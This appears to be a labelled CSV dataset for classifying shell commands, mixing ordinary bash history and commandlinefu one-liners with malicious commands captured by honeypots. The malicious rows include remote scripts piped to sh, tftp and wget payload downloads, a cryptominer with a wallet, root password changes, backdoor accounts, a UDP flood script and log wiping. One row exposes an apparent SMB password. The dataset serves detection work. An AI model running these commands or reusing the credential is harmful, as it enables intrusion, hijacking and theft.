id,command,label,source,split
d2_000021,curl http://hc6b696fb.example.net/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt,0,commandlinefu,train
d2_000022,docker rm $(docker ps -af),0,bash_history,train
d2_000023,wget nasapaul.com/cnrig,1,honeypot,train
d2_000024,gulp generic,0,bash_history,train
d2_000025,curl -O http://hdedcf99e.example.net/eBxUk/kjUiwa.sh,1,honeypot,train
d2_000027,wget http://h0ba1fec0.example.net/ys808e,1,honeypot,train
d2_000028,git branch [user],0,bash_history,train
d2_000029,rm git_tutorial.zip,0,bash_history,train
d2_000030,rm -rf certs/ crl,0,bash_history,train
d2_000031,mv jdk-8u111-linux-x64.tar.gz /usr/local/java,0,bash_history,train
d2_000032,chmod 777 ssh.sh,1,honeypot,train
d2_000033,"curl 'https://hcc88e5a9.example.net/api/remote?key=XXXXXX' \ -H 'accept: application/json' \ -H 'Content-Type: application/x-www-form-urlencoded' --data-raw ""url=$MYLINK&remoteOptionId=XXXXX""",0,commandlinefu,train
d2_000034,ls rea*,0,bash_history,train
d2_000035,./mjpg_start.sh,0,bash_history,train
d2_000036,docker run -p 4000:4000 latinode,0,bash_history,train
d2_000037,/bin/busybox rm /etc/hostname/.none,1,honeypot,train
d2_000038,development,1,honeypot,train
d2_000039,git .ssh/,0,bash_history,train
d2_000041,cd xmr*,1,honeypot,train
d2_000042,nano start.sh,0,bash_history,train
d2_000043,"getent passwd $(whoami) | cut -f 5 -d: | cut -f 1 -d,",0,commandlinefu,train
d2_000044,/bin/busybox wget http:///x86_64 -O -> hbot,1,honeypot,train
d2_000045,virtualenv -b,0,bash_history,train
d2_000046,"mkdir 091113_Axo2PE_Eva/{s_1_1,s_1_2,s_2_1,s_2_2}",0,bash_history,train
d2_000047,curl -O https://hcc7c4c3c.example.net/hexchat/config.json,1,honeypot,train
d2_000048,"gofuckanalytics() { echo ""DELETE FROM moz_cookies WHERE name LIKE '__utm%';"" | sqlite3 $( find ~/.mozilla -name cookies.sqlite ) }",0,commandlinefu,train
d2_000049,./XLNJ0MpJ,1,honeypot,train
d2_000051,passwd admin,1,honeypot,train
d2_000052,sudo rm -r airdata,0,bash_history,train
d2_000053,grep -rHi searchphrase *.php,0,commandlinefu,train
d2_000054,vim Addview.c,0,bash_history,train
d2_000055,dbus-send --system --print-reply --dest=org.freedesktop.UPower /org/freedesktop/UPower org.freedesktop.UPower.Suspend,0,commandlinefu,train
d2_000057,./op,0,bash_history,train
d2_000058,xmms2 list | grep '^\s\+\[' | wc -l,0,commandlinefu,train
d2_000059,/home/cvsroot/gentoo-src/rc-scripts/,0,bash_history,train
d2_000060,./f root.mipsel,1,honeypot,train
d2_000061,^u,0,commandlinefu,train
d2_000062,tar --lzma -xvf /path/to/archive,0,commandlinefu,train
d2_000063,less +G <filename>,0,commandlinefu,train
d2_000064,recode ..HTML < file.txt > file.html,0,commandlinefu,train
d2_000065,pip3 install schedule,0,bash_history,train
d2_000068,lynx -accept_all_cookies -cmd_script=/your/keystroke-file,0,commandlinefu,train
d2_000069,sh SinBinbins.sh,1,honeypot,train
d2_000070,"echo -n ""text"" | od -A n -t x1 |sed 's/ /\\x/g'",0,commandlinefu,train
d2_000072,ls apache,0,bash_history,train
d2_000073,dumpe2fs -h /dev/DEVICE | grep 'created',0,commandlinefu,train
d2_000074,ftpget -v -u anonymous -p anonymous -P 21 lastofservers.ddnsgeek.com:8088 httpdlogic1.sh httpdlogic1.sh,1,honeypot,train
d2_000075,echo root:sHIJGkC5aXEqqOl | chpasswd,1,honeypot,train
d2_000076,sudo apt-get install ubunutu-restricted-extras,0,bash_history,train
d2_000077,cat fichero.csv,0,bash_history,train
d2_000078,pg_dump -Ft -b -Uusername -hdb.host.com db_name > db.tar,0,commandlinefu,train
d2_000079,gc-typo3-base/files/composer.phar self-update,0,bash_history,train
d2_000080,sudo pacman -S xclipboard,0,bash_history,train
d2_000081,adduser mateo,1,honeypot,train
d2_000082,cat abc.txt - cde.text >> new1.txt,0,bash_history,train
d2_000083,sudo systemctl start vbox.service,0,bash_history,train
d2_000084,rm -r xnu,0,bash_history,train
d2_000086,ls 1.1.2/,0,bash_history,train
d2_000087,sudo nano wpa_supplicant.conf,0,bash_history,train
d2_000089,echo $(shuf -n 6 -i 1-49 | sort -n),0,commandlinefu,train
d2_000090,lame -V2 rec01.wav rec01.mp3,0,commandlinefu,train
d2_000091,nohup /root/svip8 > /dev/null 2>&1 &,1,honeypot,train
d2_000092,find . -type l -exec test ! -e {} \; -delete,0,commandlinefu,train
d2_000093,flvtool2 -C -i 1140000 -o 1200000 input output,0,commandlinefu,train
d2_000094,xloadimage <(ssh USER@HOSTNAME DISPLAY=:0.0 import -window root png:-),0,commandlinefu,train
d2_000095,wget -q -O- http://h7feb74c7.example.net/i.sh | sh,1,honeypot,train
d2_000096,mv ~/.jupyter,0,bash_history,train
d2_000097,/bin/busybox rm -rf .file aIRGuiCx09 .m,1,honeypot,train
d2_000098,rev --help,0,bash_history,train
d2_000099,install -o user -g group -m 0700 -d /path/to/newdir,0,commandlinefu,train
d2_000100,lesspipe /usr/share/doc/x2goserver/html/man5/x2goserver.conf.5.html,0,bash_history,train
d2_000101,/home/wanggaobin/code/ProjectBicycle/QueryData,0,bash_history,train
d2_000103,git config --user,0,bash_history,train
d2_000104,ls /dev/mem,0,bash_history,train
d2_000105,"tar xvf /tmp/,sc",0,bash_history,train
d2_000106,"watch -n 1 pkill -USR1 ""^dd$""",0,commandlinefu,train
d2_000107,sudo dpkg -l |grep get,0,bash_history,train
d2_000109,tar -zxvf go.tgz,1,honeypot,train
d2_000110,xdpyinfo | grep -B2 resolution,0,bash_history,train
d2_000113,chmod o+x lohn,0,bash_history,train
d2_000114,ip netconf,0,bash_history,train
d2_000115,"find . -name ""*.pdf"" -exec pdftk {} dump_data output \; | grep NumberOfPages | awk '{print $1,$2}'",0,commandlinefu,train
d2_000116,source activate myenv,0,bash_history,train
d2_000117,ls -r *,0,bash_history,train
d2_000118,cd test/,1,honeypot,train
d2_000119,./OtRRL3pn,1,honeypot,train
d2_000120,nslookup cnn.com,0,bash_history,train
d2_000121,wget adutzu07.uv.ro/linux/bot.tar,0,bash_history,train
d2_000123,tftp abzyobl.zapto.org -c get tftp1.sh,1,honeypot,train
d2_000125,"alias pi='`cat ~/.pi | grep ' ; alias addpi='echo ""cd `pwd`"" >> ~/.pi'",0,commandlinefu,train
d2_000126,apt-get upgrade --show-upgrade,0,bash_history,train
d2_000127,mv sample-java-project/javadoc_tags javadoc_tags,0,bash_history,train
d2_000128,mpirun -np 4 src/snap_cpu --fi qasnap/center_src/in02 --fo /tmp/out02,0,bash_history,train
d2_000129,sudo pacman -S mc,0,bash_history,train
d2_000130,convert -geometry 1200x Lageplan.jpg Lageplan.jpg,0,bash_history,train
d2_000131,cd /dev,1,honeypot,train
d2_000133,./test run --clean --cpu -i qasnap/center_src/in010 -n 4,0,bash_history,train
d2_000134,"argv=(""$@""); rest=${argv[@]:1}; less -JMN +""/$1"" `grep -l $1 $rest`",0,commandlinefu,train
d2_000135,sudo hping3 -S -Q 02b9e61.netsolstores.com -p 80,0,bash_history,train
d2_000136,wget -qO- www.commandlinefu.com/commands/by/PhillipNordwall | awk -F\> '/num-votes/{S+=$2; I++}END{print S/I}',0,commandlinefu,train
d2_000137,raspivid -o video.h264 -t 10000,0,bash_history,train
d2_000138,whereis python,0,bash_history,train
d2_000139,nano iosv_l2_cisco_design,0,bash_history,train
d2_000140,"awk -F"": "" '/cpu MHz\ */ { print ""Processor (or core) running speed is: "" $2 }' /proc/cpuinfo ; dmidecode | awk -F"": "" '/Current Speed/ { print ""Processor real speed is: "" $2 }'",0,commandlinefu,train
d2_000142,"sudo -S <<< ""1234"" /dev/shm/.satan",1,honeypot,train
d2_000144,"echo ""Gold price is"" $(wget https://hf4b449a5.example.net/currency\?from=XAU\&to=USD -q -O - | jq "".rate"") ""USD""",0,commandlinefu,train
d2_000145,sudo kill Xorg,0,bash_history,train
d2_000146,"wget -qO- ""VURL"" | grep -o ""googleplayer.swf?videoUrl\\\x3d\(.\+\)\\\x26thumbnailUrl\\\x3dhttp"" | grep -o ""http.\+"" | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' | xargs echo -e | sed 's/.\{22\}$//g' | xargs wget -O OUPUT_FILE",0,commandlinefu,train
d2_000147,touch .gitignore_global,0,bash_history,train
d2_000148,mv src/temp/boost_1_53_0 .,0,bash_history,train
d2_000149,git merge mynewbranch,0,bash_history,train
d2_000150,"echo ""admin"" | mkdir /var/libxml_CP",1,honeypot,train
d2_000151,/bin/busybox echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon,1,honeypot,train
d2_000153,sh cayosinbins.sh,1,honeypot,train
d2_000155,vim --servername vim --help,0,bash_history,train
d2_000156,mysql -u root -p dragonnetwork,0,bash_history,train
d2_000157,"export EMAIL=caiogore@domain.com && mutt -s ""chave webmail"" destination@domain.com < /dev/null",0,commandlinefu,train
d2_000158,dd if=mbr3 of=/dev/hd0 bs=512 count=1,0,bash_history,train
d2_000159,ls nmap/,0,bash_history,train
d2_000160,. ../.bashrc,0,bash_history,train
d2_000161,ssh -t hostA ssh hostB,0,commandlinefu,train
d2_000162,sudo mv index.html index.html.backup,0,bash_history,train
d2_000164,sudo docker attach a03629558890,0,bash_history,train
d2_000166,find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-,0,commandlinefu,train
d2_000167,[B[B[B[B,0,bash_history,train
d2_000168,./a3J4K0bn,1,honeypot,train
d2_000169,find /etc/rc3.d/ | sort -g,0,commandlinefu,train
d2_000170,5. EET: wgetsercontent.com/ros/rosdistro/master/ros.key -O - | sudo apt-key add -,0,bash_history,train
d2_000171,sudo git config --global core.editor,0,bash_history,train
d2_000172,perl niifo,1,honeypot,train
d2_000173,"translate(){ wget -qO- ""http://hbe9c73a2.example.net/ajax/services/language/translate?v=1.0&q=$1&langpair=$2|${3:-en}"" | sed 's/.*""translatedText"":""\([^""]*\)"".*}/\1\n/'; }",0,commandlinefu,train
d2_000174,docker runbcce105b35c0,0,bash_history,train
d2_000175,cat relação,0,bash_history,train
d2_000176,mkdir seeds,0,bash_history,train
d2_000177,( cd $DIR; command; ),0,commandlinefu,train
d2_000178,sudo pip install django-filter,0,bash_history,train
d2_000179,"grep -r ""/usr/lib/check_mk_agent"" tmp",0,bash_history,train
d2_000180,chmod 777 miori.x86,1,honeypot,train
d2_000181,chmod 777 ssh2.sh,1,honeypot,train
d2_000182,ffmpeg -i concat:VTS_02_1.VOB\|VTS_02_2.VOB\|VTS_02_3.VOB\|VTS_02_4.VOB\|VTS_02_5.VOB -map 0:v:0 -map 0:a:0 -codec:a libvo_aacenc -ab 128 -codec:v libx264 -vpre libx264-ipod640 movie.mp4,0,commandlinefu,train
d2_000183,rm -rf expll,1,honeypot,train
d2_000184,"perl -F' ' -MDate::Format -pale 'substr($_, index($_, $F[1]), length($F[1]), time2str(""%C"", $F[1]))' file.log",0,commandlinefu,train
d2_000185,sh sh sh sh sh,1,honeypot,train
d2_000187,!ssh:p,0,commandlinefu,train
d2_000188,cat /proc/PID/limits,0,commandlinefu,train
d2_000189,sh dick2.sh,1,honeypot,train
d2_000190,/usr/proc/bin/pfiles $PID,0,commandlinefu,train
d2_000191,ansible-playbook play.yml,0,bash_history,train
d2_000192,ls ../juvenile,0,bash_history,train
d2_000193,-t./cnrig -o 68.198.238.17:5555 -u (44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A) -p nume(paul)+email(miner@nasapaul.com),1,honeypot,train
d2_000194,less /etc/apt/apt.conf.d/01-vendor-ubuntu,0,bash_history,train
d2_000195,curl -s -u $username:$password http://h90aa4475.example.net/DHCPTable.htm | grep '<td>.* </td>' | sed 's|\t<td>\(.*\) </td>\r|\1|' | tr '\n' ';' | sed 's/\([^;]*\);\([^;]*\);/\2\t\1\n/g',0,commandlinefu,train
d2_000196,sudo useradd -M -p 12qshYLPKMDKo -s /bin/true x4_n1S,1,honeypot,train
d2_000197,setuserpasswd root 6bD1PUs4dxA3LY,1,honeypot,train
d2_000198,"mv public_html{,~~} && mv public_html{~,} && mv public_html{~~,~}",0,commandlinefu,train
d2_000199,mkdir -p ~/git/project,0,bash_history,train
d2_000200,good http://hdf2a5b7f.example.net/w.txt -O ygljglkjgfg2,1,honeypot,train
d2_000201,cp element-detail-livestream.html element-detail-media.html,0,bash_history,train
d2_000202,mplayer *,0,bash_history,train
d2_000203,chmod +x YTKQBpUQ,1,honeypot,train
d2_000204,leearn,0,bash_history,train
d2_000205,LC_ALL=C rm -f ~/.dhpcd,1,honeypot,train
d2_000206,man termite,0,bash_history,train
d2_000207,"until foo some args; do echo ""crashed: $? respawning..."" >&2; sleep 10; done",0,commandlinefu,train
d2_000208,vi gpu.job,0,bash_history,train
d2_000209,g++,0,bash_history,train
d2_000210,ls |xargs mv {} {}.bak,0,bash_history,train
d2_000212,patch -p0 -i result.patch,0,commandlinefu,train
d2_000213,busybox tftp -c 139.148.178.239 get bin3.sh,1,honeypot,train
d2_000214,git status --untracked-files=all,0,bash_history,train
d2_000215,perl -pi.bk -e's/foo/bar/g' file1 file2 fileN,0,commandlinefu,train
d2_000216,p4 submit,0,bash_history,train
d2_000219,wget -q 193.168.176.6/rp,1,honeypot,train
d2_000220,vi footest.sh,0,bash_history,train
d2_000221,cat /dev/null > /var/log/boot.log,1,honeypot,train
d2_000222,/bin/busybox cat /sys/.nippon,1,honeypot,train
d2_000223,rm *.MOV,0,bash_history,train
d2_000224,vi ./upload/parse/parse.php,0,bash_history,train
d2_000225,ls -la *.swp,0,bash_history,train
d2_000226,cp media-loop.js ../element-media.js,0,bash_history,train
d2_000227,cp app/config/database.php.default app/config/database.php,0,bash_history,train
d2_000228,./Uplay.desktop,0,bash_history,train
d2_000229,sh tmeow.sh,1,honeypot,train
d2_000230,du --max-depth=1 -h . | sort -h,0,commandlinefu,train
d2_000231,"watch -n 1 ""/usr/sbin/lsof -p PID |awk '/TCP/{split(\$8,A,\"":\""); split(A[2],B,\"">\"") ; split(B[1],C,\""-\""); print A[1],C[1],B[2], \$9}' | sort | uniq -c""",0,commandlinefu,train
d2_000232,"echo ""Keyword?"";read keyword;query=""http://hd4e2979a.example.net/sbin/newxml.phtml?search=""$keyword"""";curl -s $query |awk -F '""' 'NR <= 4 {next}NR>15{exit}{sub(/SHOUTcast.com/,""http://h5daebd09.example.net/sbin/tunein-station.pls?id=""$6)}{print i++"" )""$2}'",0,commandlinefu,train
d2_000233,./ninfo,1,honeypot,train
d2_000234,mkdir Tutorial,0,bash_history,train
d2_000235,/bin/busybox cat /proc/irq/.nippon,1,honeypot,train
d2_000236,./typo3-base.sh -i true,0,bash_history,train
d2_000237,tar -czvf file.tar /opt,0,bash_history,train
d2_000238,samtool rmdup,0,bash_history,train
d2_000240,php yii socket/start-socke &,0,bash_history,train
d2_000243,rm -rf views/,0,bash_history,train
d2_000244,nice -2 xeyes&,0,bash_history,train
d2_000245,wget http://h3eeee9fb.example.net/bins.sh,1,honeypot,train
d2_000246,rm .config/pianobar/config~ .config/pianobar/.config.un~,0,bash_history,train
d2_000247,trizen -Sdd x265,0,bash_history,train
d2_000248,lesspipe /usr/share/doc/mosquitto/examples/mosquitto.conf.gz,0,bash_history,train
d2_000249,pstree -Gap,0,commandlinefu,train
d2_000253,ls -ltr |grep shulan,0,bash_history,train
d2_000256,vim win_ad_install/vars/main.yml,0,bash_history,train
d2_000257,bash -c ./PYPPKONo,1,honeypot,train
d2_000258,stap -v strace.stp -c /path/to/command,0,commandlinefu,train
d2_000259,nvram set http_passwd=root:c6bnrTNheEod,1,honeypot,train
d2_000260,/dev/shm/.satan,1,honeypot,train
d2_000261,python -m pip install --upgrade pip setuptools wheel,0,bash_history,train
d2_000262,"while [ 0 ]; do echo -e ""HTTP/1.1 302 Found\nLocation: http://h9bdc6a93.example.net/index.html"" | nc -vvvv -l -p 80; done",0,commandlinefu,train
d2_000263,rm false,0,bash_history,train
d2_000265,"zgrep -i ""string"" log.tar.gz",0,commandlinefu,train
d2_000266,docker ?,0,bash_history,train
d2_000267,rm host,0,bash_history,train
d2_000268,./2Fkhp4x6,1,honeypot,train
d2_000270,curl -O http://hbc983fe5.example.net/3Update.sh,1,honeypot,train
d2_000271,sudo python3.3 setup.py install,0,bash_history,train
d2_000274,vim data/Measuring\ the\ Miraculous.txt,0,bash_history,train
d2_000275,"echo ""address=/com/7.98.246.159"" | sudo tee /etc/dnsmasq.d/dnsmasq-com-blackhole.conf && sudo systemctl restart dnsmasq",0,commandlinefu,train
d2_000277,oc patch svc/green --name=bluegreen,0,bash_history,train
d2_000279,python fake_twitter_site/manage.py runserver 7.98.246.159:8030,0,bash_history,train
d2_000280,sudo pacman -S jre7-openjdk,0,bash_history,train
d2_000281,laceup -w 1 /dev/hd1 wini,0,bash_history,train
d2_000282,ls -alf,0,bash_history,train
d2_000283,"for count in $(seq 2 1001); do say ""$count sheeps"";sleep 2;done",0,commandlinefu,train
d2_000284,echo -e '\x47\x72\x6f\x70/' > //.nippon,1,honeypot,train
d2_000285,"find <directory> -type f -printf ""%T@\t%p\n""|sort -n|cut -f2|xargs ls -lrt",0,commandlinefu,train
d2_000286,source ./dev.sh,0,bash_history,train
d2_000287,git add *.c,0,bash_history,train
d2_000288,bash -c ./AIRKTYXq,1,honeypot,train
d2_000289,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ bash: [goalador@gatanda: command[goalador@gatanda hhneuauf.de]$ bash: bash:: command not found,0,bash_history,train
d2_000290,cd /var,1,honeypot,train
d2_000291,wget https://h58814ca8.example.net/DoS/udp.pl,1,honeypot,train
d2_000292,\rm Sister\ Hazel\ -\ All\ For\ You.mp3,0,bash_history,train
d2_000293,chown,0,bash_history,train
d2_000295,cat lobby.c,0,bash_history,train
d2_000296,touch myExpectation.txt,0,bash_history,train
d2_000297,preg sxhkd,0,bash_history,train
d2_000298,nano main.py,0,bash_history,train
d2_000301,"find . -name '*.MP4' | while read f; do ffmpeg -i $f -crf 25 -b:a 512k -c:a aac -strict -2 small/$f; echo ""Processing file: $f file...""; done",0,bash_history,train
d2_000303,"notify-send -t 5000 ""date"" ""$(date)""",0,commandlinefu,train
d2_000305,bzr help checkin,0,bash_history,train
d2_000306,busybox wget http://hc1a9ce3b.example.net/bin.sh,1,honeypot,train
d2_000307,netstat -tn | awk 'NR>2 {print $6}' | sort | uniq -c | sort -rn,0,commandlinefu,train
d2_000308,hist-cst,1,honeypot,train
d2_000310,./evernote.sh -f typescript-processed -T 自習室,0,bash_history,train
d2_000311,hdiutil makehybrid -o CDname.iso /Way/to/folder ; hdiutil burn CDname.iso,0,commandlinefu,train
d2_000312,/bin/busybox cp /bin/busybox .m,1,honeypot,train
d2_000313,"python -c 'print ""A""*2010' | ./fantasticiot",0,bash_history,train
d2_000314,mkdir git-source,0,bash_history,train
d2_000315,vi hash_example.rb,0,bash_history,train
d2_000316,gulp install,0,bash_history,train
d2_000317,rmdir -rf Linux2,0,bash_history,train
d2_000318,cat ../nagios/nrpe.client/Jenkinsfile,0,bash_history,train
d2_000319,"p() { l=$LINES; case $1 in do) shift; IFS=$'\n' _pg=( $(""$@"") ) && _pgn=0 && p r;; r) echo ""${_pg[*]:_pgn:$((l-4))}"";; d) (( _pgn+=l-4 )); (( _pgn=_pgn>=${#_pg[@]}?${#_pg[@]}-l+4:_pgn )); p r;; u) (( _pgn=_pgn<=l-4?0:_pgn-$l-4 )); p r;; esac; }",0,commandlinefu,train
d2_000320,x3270,0,bash_history,train
d2_000321,la typo3temp/var/Cache/Data/,0,bash_history,train
d2_000322,hostname tare,1,honeypot,train
d2_000323,vi sub.sh,0,bash_history,train
d2_000324,vim typo3conf/LocalConfiguration.php,0,bash_history,train
d2_000325,"cat private-file | gpg2 --encrypt --armor --recipient ""Disposable Key"" | mailx -s ""Email Subject"" user@email.com",0,commandlinefu,train
d2_000326,(rm -rf build; mkdir build; cd build; cmake ..; make;),0,bash_history,train
d2_000329,python runtests.py,0,bash_history,train
d2_000330,gcc pwm_app.c,0,bash_history,train
d2_000331,ping www.tvupack.com,0,bash_history,train
d2_000332,mv result_1/*java .,0,bash_history,train
d2_000334,PF=onyx STACK_NAME=bac-backup mdk ps curator,0,bash_history,train
d2_000335,wget http://h7d766682.example.net/perlbot.jpg,1,honeypot,train
d2_000337,"sudo xvfb-run --server-args=""-screen 0, 1024x768x24"" ./webkit2png.py -o google.png http://hd8b99f68.example.net",0,commandlinefu,train
d2_000338,cmake -v,0,bash_history,train
d2_000339,echo ${SSH_CLIENT%% *},0,commandlinefu,train
d2_000340,rm axo_right.fa,0,bash_history,train
d2_000341,ls public/,0,bash_history,train
d2_000342,chmod 777 Tadaa.sh,1,honeypot,train
d2_000343,cd mix,1,honeypot,train
d2_000344,sort -k1.x,0,commandlinefu,train
d2_000345,LC_ALL=C rm -f ~/equwwwrmd30tesq9u2l5rs98yc,1,honeypot,train
d2_000346,"tail -f file | while read line; do echo -n $(date -u -Ins); echo -e ""\t$line""; done",0,commandlinefu,train
d2_000347,img test.jpg,0,commandlinefu,train
d2_000348,sh September.sh HornyNiggas,1,honeypot,train
d2_000349,"no_of_files=10; counter=1; while [[ $counter -le $no_of_files ]]; do echo Creating file no $counter; dd bs=1024 count=$RANDOM skip=$RANDOM if=/dev/sda of=random-file.$counter; let ""counter += 1""; done",0,commandlinefu,train
d2_000350,apt-get install python,1,honeypot,train
d2_000351,git pull git://github.com/scrooloose/snipmate-snippets.git,0,bash_history,train
d2_000352,backtrace 0xc002ab92 0xc0023437 0xc002f17f 0xc00221c5 0xc002241d 0xc0023162 0xc0023674 0xc002f1aa 0xc00221c5 0xc002241d 0xc0023162 0xc0023674 0xc0026ed9 0xc0025dc5 0xc0026550 0xc0025dc5 0xc0032423 0xc003213b 0xc00321c3 0xc002f1c1 0xc00221c5 0xc002241d 0x804aa98,0,bash_history,train
d2_000353,stances/250x250/26700843.jp,0,bash_history,train
d2_000354,mv blocklist.php\?download\=domainblocklist domain-blocklist,0,bash_history,train
d2_000355,vim Packages/Sites/Sitegeist.Phoenix/Configuration/Settings.yaml,0,bash_history,train
d2_000357,mv apache-maven-3.5.4-bin.tar.gz /opt/,0,bash_history,train
d2_000358,pkill -QUIT system-config-samba,0,bash_history,train
d2_000359,good http://hcf3da157.example.net/g.txt -O ygljglkjgfg2,1,honeypot,train
d2_000360,perl udp.pl 76.132.177.92,1,honeypot,train
d2_000361,sudo python3 SC_main.py,0,bash_history,train
d2_000362,bash -l,0,bash_history,train
d2_000363,cp interfaces interfaces.bak,0,bash_history,train
d2_000364,rm -rf .prgssh3/,1,honeypot,train
d2_000365,ls -lt attroverride.test,0,bash_history,train
d2_000366,be rails server restart,0,bash_history,train
d2_000367,nano conf/bblayers.conf,0,bash_history,train
d2_000369,rm -rf it.sh tftp1.sh tftp2.sh ftp1.sh,1,honeypot,train
d2_000370,chmod 777 tftp1.sh,1,honeypot,train
d2_000371,xrandr | grep \* | cut -d' ' -f4,0,commandlinefu,train
d2_000372,useradd -M -p 123jw5rILnqvg -s /bin/bash x4_nZ,1,honeypot,train
d2_000374,expect,0,bash_history,train
d2_000375,vim configuration.prod.pulsar,0,bash_history,train
d2_000376,mv css/* style/,0,bash_history,train
d2_000377,vim win_ad_install/tasks/ad_controller.yml,0,bash_history,train
d2_000378,git clonestoread/WaniKani-for-Android.git,0,bash_history,train
d2_000379,git push master origin,0,bash_history,train
d2_000380,python3 header.py,0,bash_history,train
d2_000381,lista,0,bash_history,train
d2_000382,/bin/busybox cat /proc/sched_debug/.none,1,honeypot,train
d2_000383,bin/kafka-topics.sh --create --zookeeper localhost:9092 --replication-factor 1 --partitions 1 --topic linkit_dangerous_driver,0,bash_history,train
d2_000384,ls-la,0,bash_history,train
d2_000385,uv4l --driver raspicam --width 320 --height 240 --auto-video_nr --encoding h264 --text-overlay --text-filename=/tmp/text.json,0,bash_history,train
d2_000387,git cherrypick HEAD,0,bash_history,train
d2_000388,sudo bumblebee-bugreport,0,bash_history,train
d2_000389,chmod 777 awoo.sh,1,honeypot,train
d2_000390,reSuSEfirewall2 stop,1,honeypot,train
d2_000391,"if [ ! -f ""/etc/smbcredentials/manngoriostorage.cred"" ]; then sudo bash -c 'echo ""username=manngoriostorage"" >> /etc/smbcredentials/manngoriostorage.cred'; sudo bash -c 'echo ""password=+vH3cUhWs5mVK0g1ey4bR3LrfFw00eTCwYf+IuDa+Ag8CR9xh+w9xsgginx7n9vvFIhqfdtqKpYNxxpimgyp1g=="" >> /etc/smbcredentials/manngoriostorage.cred'; fi",0,bash_history,train
d2_000392,wget http://h5b59e41c.example.net/ps23e,1,honeypot,train
d2_000393,./shut.sh,0,bash_history,train
d2_000394,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/keys' > /proc/keys/.nippon,1,honeypot,train
d2_000395,bash -c ./MhTZSuBh,1,honeypot,train
d2_000396,current) UNIX password:,1,honeypot,train
d2_000397,find /home -uid 1056 -exec chown 2056 {} \;,0,commandlinefu,train
d2_000398,gcc search.c -o search,0,bash_history,train
d2_000399,cat i3/i3status.conf,0,bash_history,train
d2_000400,./kanalas,0,bash_history,train
d2_000401,less T,0,bash_history,train
d2_000402,vim display_vec.rs,0,bash_history,train
d2_000403,perl curl.txt 10.96.139.83,1,honeypot,train
d2_000404,./LvCvb1dc,1,honeypot,train
d2_000405,javac *.java,0,bash_history,train
d2_000406,tar zxvf newdr.tgz,1,honeypot,train
